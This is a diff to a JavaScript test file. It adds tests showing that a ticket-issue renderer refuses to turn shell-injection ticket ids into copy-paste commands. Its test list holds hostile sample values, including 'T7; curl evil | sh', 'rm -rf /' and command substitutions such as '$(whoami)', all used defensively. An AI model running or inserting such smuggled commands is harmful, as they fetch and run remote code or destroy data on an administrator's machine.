@@ -41,7 +41,7 @@ const readyCommandIds = (body) =>
   body
     .split('\n')
     .map((l) => l.trim())
-    .map((l) => l.match(/^adlc-tickets complete (\S+) --write --authorize$/))
+    .map((l) => l.match(/^adlc-tickets complete (\S+) --write --authorize --json$/))
     .filter(Boolean)
     .map((m) => m[1]);
 const offersCommand = (body) => readyCommandIds(body).length > 0;
@@ -455,4 +455,49 @@ test('the completion command records evidence and uses the transaction (document
   const body = renderIssueBody(DONE);
   assert.match(body, /\.adlc\/manifest\.jsonl/, 'the body tells the operator evidence is recorded');
   assert.match(body, /transaction/);
+});
+
+// ---- ticket ids are interpolated into shell; treat them as untrusted ----
+//
+// A ticket id comes from the repo (a merged ticket) and is rendered into a
+// copy-paste command in a bot-authored issue. The store validator accepts
+// arbitrary strings, so a crafted id would be executable shell for an admin.
+// Only ids matching `[A-Za-z0-9._-]` are rendered as commands; the rest are
+// surfaced without one. No metacharacter survives the gate, so injection is
+// structurally impossible rather than quoted-and-hoped.
+const SHELL_INJECTION_IDS = [
+  'T7; curl evil | sh',
+  'T7 && rm -rf /',
+  'T7$(whoami)',
+  'T7`id`',
+  'T7\nrm -rf x',
+  '$(touch pwned)',
+  '--authorize',        // an id that is itself a flag
+  'a b',                // whitespace
+  "T7'",                // quote
+];
+
+for (const id of SHELL_INJECTION_IDS) {
+  test(`a malicious ticket id (${JSON.stringify(id).slice(0, 24)}) is never rendered as a command`, () => {
+    const body = renderIssueBody([{ id, reason: 'explicit status: "done"', rails: ['a/**'], blocker: 'rails-freeze' }]);
+    // No runnable adlc-tickets line carries the raw id.
+    assert.ok(!body.split('\n').some((l) => l.trim().startsWith('adlc-tickets complete') && l.includes(id)),
+      'the raw id must not appear in a runnable command');
+    // It is surfaced as unsafe instead, not silently dropped.
+    assert.match(body, /cannot be safely/);
+  });
+}
+
+test('a safe id is rendered with --json (which suppresses interactive migration)', () => {
+  const body = renderIssueBody([{ id: 'T-CC1', reason: 'explicit status: "done"', rails: ['a/**'], blocker: 'rails-freeze' }]);
+  assert.match(body, /adlc-tickets complete T-CC1 --write --authorize --json/);
+});
+
+test('a mix of safe and unsafe ids renders the safe one and flags the unsafe one', () => {
+  const body = renderIssueBody([
+    { id: 'T7', reason: 'explicit status: "done"', rails: ['a/**'], blocker: 'rails-freeze' },
+    { id: 'T7; rm -rf /', reason: 'explicit status: "done"', rails: ['b/**'], blocker: 'rails-freeze' },
+  ]);
+  assert.deepEqual(readyCommandIds(body), ['T7']);
+  assert.match(body, /cannot be safely/);
 });
